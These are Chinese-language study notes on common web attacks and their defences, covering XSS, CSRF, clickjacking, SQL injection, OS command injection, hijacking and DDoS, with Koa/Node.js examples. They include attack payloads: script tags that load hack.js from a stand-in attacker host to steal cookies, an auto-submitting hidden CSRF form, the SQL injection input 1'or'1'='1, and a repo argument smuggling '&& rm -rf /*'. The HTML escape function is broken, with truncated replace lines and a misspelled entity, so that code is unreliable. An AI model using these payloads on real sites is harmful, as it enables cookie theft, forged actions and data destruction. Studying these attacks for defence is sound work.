常见web攻击：
--------------------------------------------------------------------------------------------------------------------------------
1、XSS（Cross-Site Scripting 跨站脚本攻击）：
概念：通过向网站注入非法的JS脚本来攻击网站（黑客注入脚本窃取用户的Cookie值，从而模仿用户登录进行任意操作）。
xss攻击分类：
1）反射型：通过url参数直接注入，（黑客发送恶意链接给用户点击）
普通：http://localhost:3000/?from=china
黑客alert尝试：http://localhost:3000/?from=<script>alert(1)</script>
黑客注入脚本获取cookie进行攻击：
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>
(短域名伪造:https://dwz.cn/, 将长域名进行伪造，使url看起来像普通正常的url，诱使用户点击)

2）存储型：存储到DB后读取时注入，（例如在用户输入框input，textarea注入非法的JS脚本，提交表单存储在数据库中）
评论：<script>alert(1)</script>
跨站脚本注入：<script src="http://localhost:4000/hack.js"></script>
【用户不需要点击黑客链接，只要在正常网站上查看了评论就可能受到攻击，危害程度比反射型大得多。】

如何防范xss攻击？
1、页面使用ejs模板时：
<% code %>用于执行其中javascript代码； 
<%= code %>会对code进行html转义； 
<%- code %>将不会进行转义

2、HEAD设置(http请求头部设置)：
//启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
//参数出现在HTML内容或属性浏览器会拦截，但如果使用短链接进行伪装就无法识别
//0 禁止XSS过滤。 
//1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
//1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。 
//1;report= (Chromium only) 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri 指令的功能发送违规报告。
ctx.set('X-XSS-Protection', 1)

3、CSP设置(建立白名单)：
//内容安全策略(CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 
//CSP本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。
ctx.set('Content-Security-Policy', "default-src 'self'")   //只允许加载本站资源
ctx.set('Content-Security-Policy', "img-src 'https://*'")  //只允许加载 HTTPS 协议图片
ctx.set('Content-Security-Policy', "child-src 'none'")     //不允许加载任何来源框架

4、对于用户输入的处理：转义字符
用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义
function escape(str) {    
    str = str.replace(/&/g, '&amp;')
    str = str.replace(/</g, '&lt;') 
    str = str.replace(/>/g, '&gt;') 
    str = str.replace(/"/g, '&quto;')
    str = str.replace(/'/g, '&#3
    str = str.replace(/`/g, '&#9
    str = str.replace(/\//g, '&#x)
    return str  
}
富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。
对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。
 const xss = require('xss')  
 let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
 console.log(html)
 
 5、HttpOnly Cookie: (设置后，无法通过js读取cookie信息)
 response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
 这是预防XSS攻击窃取用户cookie最有效的防御手段。
 Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。
--------------------------------------------------------------------------------------------------------------------------------
2、CSRF（Cross Site Request Forgery 跨站请求伪造）：
概念：利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。
csrf攻击场景：
用户已经登录了站点 A，并在本地记录了 cookie；
在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。 
hack_csrf:
<script>
      document.write(`<form name="form" action="http://localhost:3000/updateText" method="post" target="csrf">
        添加评论: <input type="text" name="text" value="CSRF评论。。" />
      </form>`)
      var iframe = document.createElement('iframe')
      iframe.name = 'csrf'
      iframe.style.display = 'none'
      document.body.appendChild(iframe)
      setTimeout(function() {
        document.querySelector('form').submit();
      },1000)
</script>

如何防御CSRF攻击？
1、禁止第三方网站带Cookie (浏览器设置，有兼容性问题) 

2、Referer Check:(只针对http, https不发送referer)
app.use(async (ctx, next) => {    
    await next() 
    const referer = ctx.request.header.referer
    console.log('Referer:', referer) 
}

3、验证码
--------------------------------------------------------------------------------------------------------------------------------
3、点击劫持（Click Injecting）：
概念：点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中， 并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。
如何防御？
1、设置http响应头：X-FRAME-OPTIONS
// X-FRAME-OPTIONS 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御 用 iframe 嵌套的点击劫持攻击。
ctx.set('X-FRAME-OPTIONS', 'DENY')        //表示页面不允许通过 iframe 的方式展示 
ctx.set('X-FRAME-OPTIONS', 'SAMEORIGIN')  //表示页面可以在相同域名下通过 iframe 的方式展示
ctx.set('X-FRAME-OPTIONS', 'ALLOW-FROM [uri])')  //表示页面可以在指定来源的 iframe 中展示

2、js方式：当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。 
<head>  
    <style id="click-jack">
        html {
            display: none !important;
        }  
    </style> 
</head> 
<body>  
    <script>    
        if (self == top) {
            var style = document.getElementById('click-jack')
            document.body.removeChild(style)
        } else {
            top.location = self.location
        }  
    </script> 
</body>
--------------------------------------------------------------------------------------------------------------------------------
4、SQL注入
// 填入特殊密码 1'or'1'='1
// 拼接后的SQL 
SELECT * FROM test.user WHERE username = 'laowang' AND password = '1'or'1'='1

如何防御？
1）所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户输入变量嵌 入到 SQL 语句中，即不要直接拼接 SQL 语句。
例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数
// 错误写法 
const sql = `SELECT * FROM test.user WHERE username = '${ctx.request.body.username}' AND password = '${ctx.request.body.password}`    
console.log('sql', sql)    
res = await query(sql)
 
// 正确的写法 
const sql = ` SELECT * FROM test.user WHERE username = ? AND password = ?` 
console.log('sql', sql, ) 
res = await query(sql,[ctx.request.body.username, ctx.request.body.password])

2）严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的 减少注入攻击对数据库的危害
3）后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些匹配处理
4）对进入数据库的特殊字符（'，"，\，<，>，&，*，; 等）进行转义处理，或编码转换**。基本上所有的后端 语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。
--------------------------------------------------------------------------------------------------------------------------------
5、OS命令注入
OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。
OS命令注入攻击指 通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。倘若调用Shell时存在疏漏，就可以执行插入的非法命令。
// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo 
const exec = require('mz/child_process').exec; 
let params = {/* 用户输入的参数 */}; 
exec(`git clone ${params.repo} /some/path`);
如果用户传入的参数是https://github.com/xx/xx.git && rm -rf /* &&， 就会受到攻击

如何防御？
https://segmentfault.com/p/1210000016904038/read
1）使用 execFile / spawn（针对nodejs利用了执行的命令只接受普通参数来做的过滤）
2）白名单校验：对用户输入的参数进行过滤校验，对其限制仅允许纯英文的文件名其它的都过滤掉，这样也能避免被注入的目的。
3）不要允许用户输入参数，只允许用户选择比较好。
--------------------------------------------------------------------------------------------------------------------------------
6、请求劫持
DNS劫持：DNS服务器被篡改，修改了域名解析的结果，使得访问到的不是预期的ip。
（DNS通常是由运营商下发的，可以手动修改dns服务器或者打电话让运营商解决）
HTTP劫持：运营商劫持，此时大概只能升级HTTPS了。
--------------------------------------------------------------------------------------------------------------------------------
6、DDOS
http://www.ruanyifeng.com/blog/2018/06/ddos.html
DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。 
常见攻击方方式：
SYN Flood：此攻击通过向目标发送具有欺骗性源IP地址的大量TCP“初始连接请求”SYN数据包来利用TCP握手。目标机器 响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源。
HTTP Flood：此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新 - 大量HTTP请求泛滥服务器，导致拒绝服 务。
防御手段：
1）备份网站：备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网 站出了问题，正在全力抢修。
2）HTTP 请求的拦截：高防IP--靠谱的运营商、多个 Docker、硬件、服务器、防火墙
3）带宽扩容 + CDN：提高犯罪成本
--------------------------------------------------------------------------------------------------------------------------------
